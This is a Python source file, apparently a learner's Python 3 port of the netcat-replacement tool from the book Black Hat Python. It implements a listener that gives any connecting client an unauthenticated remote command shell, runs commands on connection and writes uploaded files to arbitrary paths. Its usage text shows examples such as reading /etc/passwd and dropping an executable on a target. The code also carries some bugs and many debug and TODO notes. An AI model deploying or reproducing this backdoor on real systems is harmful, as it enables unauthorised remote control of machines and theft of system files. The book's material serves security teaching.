# Black Hat Python page 13
# Replacing Netcat - BHP Net Tool

import getopt
import socket
import subprocess
import sys
import threading

# global variables
listen = False
command = False  # True if server is executing a command shell
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


# TODO convert to optparse instead of getopt
def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen				- listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-c --command				- initialize a command shell")
    print("-u --upload=destination	- upon receiving connection upload a file and write to [destination]")
    print()
    print()
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def client_sender(buffer):
    print("[*] Creating socket")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[*] Socket created")

    try:
        # connect to target host
        client.connect((target, port))

        print("[*] Client connected")

        if len(buffer) and not command:
            client.sendall(buffer.encode('utf-8'))  # TODO send or sendall?
            print("<DEBUG> Sent an initial buffer in client_sender:", buffer, " Length is:", len(buffer))



        while True:

            # wait for data back
            recv_len = 1
            response = ""

            while recv_len:

                print("<DEBUG> Receiving data.")
                data = client.recv(4096).decode('utf-8')
                # data2 = client.recv(4096).decode('utf-8')
                # print("<DEBUG> data:", data)
                # print("<DEBUG> data2:", data2)

                recv_len = len(data)
                # recv_len = len(data) + len(data2)
                response += data
                # response += data2
                # print("<DEBUG> response:", response)

                if recv_len < 4096:
                    # print("<DEBUG> Breaking out of recv loop. recv_len:", recv_len)
                    break



            # print("<DEBUG> Printing response and reading from stdin.")
            print(response, end='')  # TODO remove the \n that print() adds

            # wait for more input
            buffer = input("")  # was raw_input() in Python 2 TODO this acts weird...
            # buffer = sys.stdin.readline()  # TODO read or readline
            # TODO needed?: buffer += "\n"
            buffer += "\n"

            # send it off
            # print("<DEBUG> client.send")
            client.sendall(buffer.encode('utf-8'))  # TODO send or sendall?

    except Exception as e:
        print("[*] Exception! Exiting.", e)
        client.close()


def server_loop():
    global target

    # if no target is defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        print("[*] Server listening")
        client_socket, addr = server.accept()
        print("[*] Client connected")

        # spin off thread to handle client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

        # print("[*] Client handler thread started")  # prints after the thread prints...


def run_command(command):
    # trim newline
    command = command.rstrip()

    # run the command and get output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute the command.\r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    print('<DEBUG> Starting client_handler')

    # check for upload
    if len(upload_destination):
        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            print('<DEBUG>  Handling upload. Waiting on socket recv...')
            data = client_socket.recv(1024).decode('utf-8') # TODO decode was not in book

            if not data:
                print('<DEBUG> Handling upload. No data, breaking out of recv loop.')
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()



            # acknowledge that we wrote the file out
            print("<DEBUG> client_socket.send")
            client_socket.sendall(("Successfully saved file to %s\r\n" % upload_destination).encode('utf-8'))

        except:
            print("<DEBUG> client_socket.send - Failed to save file")
            client_socket.sendall(("Failed to save file to %s\r\n" % upload_destination).encode('utf-8'))

    if len(execute):
        # run the command
        output = run_command(execute)

        print("<DEBUG> client_socket.send")
        client_socket.sendall(output.encode('utf-8'))  # TODO send or sendall?

    if command:
        print("<DEBUG> Seeding command loop with prompt sendall")
        client_socket.sendall("<BHP:#> ".encode('utf-8'))  # TODO Added here to 'seed' loop. send or sendall?
        while True:
            print("<DEBUG> In command loop.")  # Sending prompt.")
            # show simple command prompt
            # client_socket.sendall("<BHP:#> ".encode('utf-8'))  # TODO send or sendall?

            # receive until we see a linefeed
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                print("<DEBUG> Looping client_socket.recv until \\n found")
                len_before = len(cmd_buffer)
                cmd_buffer += client_socket.recv(1024).decode('utf-8')
                print(cmd_buffer)

                if len_before == len(cmd_buffer):
                    print("<DEBUG> No more data. Connection is broken. Ending thread by returning.")
                    return

            # send back the command output
            response = run_command(cmd_buffer)

            if not response:
                response = "".encode('utf-8')  # or = b''?

            # TODO test the string encoding... sometimes the response is bytes or str
            # fixed the type test by using type()
            if type(response) is str:
                # client_socket.re
                response = response.encode('utf-8')
            print("Response, length, type")
            print(response)
            print(len(response))
            print(type(response))

            if type(response) is not bytes:
                print('response is still not bytes... wtf?!?!?!')
                print('fixing it')
                response = b''

            # send back the response
            print("<DEBUG> Sending response.")
            client_socket.sendall(response + "<BHP:#> ".encode('utf-8'))  # TODO send or sendall?

    # TODO Adding handler for stdin/stdout... why is this not already included? telnet-like functionality

    # while True:
    #     print('<DEBUG>  Handling stdout.')
    #
    #     # wait for data back
    #     recv_len = 1
    #     response = ""
    #
    #     while recv_len:
    #
    #         print("<DEBUG> Receiving data.")
    #         data = client_socket.recv(4096).decode('utf-8')
    #         recv_len = len(data)
    #         response += data
    #
    #         if recv_len < 4096:
    #             break
    #     print("<Printing response>")
    #     print(response)
    #
    #     # wait for more input
    #     print('<DEBUG> waiting on stdin.')
    #     # buffer = input("")  # was raw_input() in Python 2 TODO this acts weird...
    #     buffer = sys.stdin.readline()  # TODO read or readline
    #     # TODO needed?: buffer += "\n"
    #
    #     print('<DEBUG> Sending input.')
    #     # send it off
    #     client_socket.send(buffer.encode('utf-8'))
    #
    # print('<DEBUG> Exiting client_handler')


# TODO refactor to remove global variables
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            print('<DEBUG> Running as command shell.')
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        print("[*] Beginning client, reading stdin.")

        # read in the buffer from the command line
        # this will block, send EOF (Ctrl-d on Linux, Ctrl-z on Windows)
        # if not sending input to stdin
        # TODO really needed?
        buffer = sys.stdin.read()  # TODO should it be read (original) or readline?

        # send data off
        print("[*] Starting client_sender with stdin buffer.")
        client_sender(buffer)

    # listen and potentially upload, execute commands or drop a shell back
    # depending on command line options
    if listen:
        server_loop()


main()
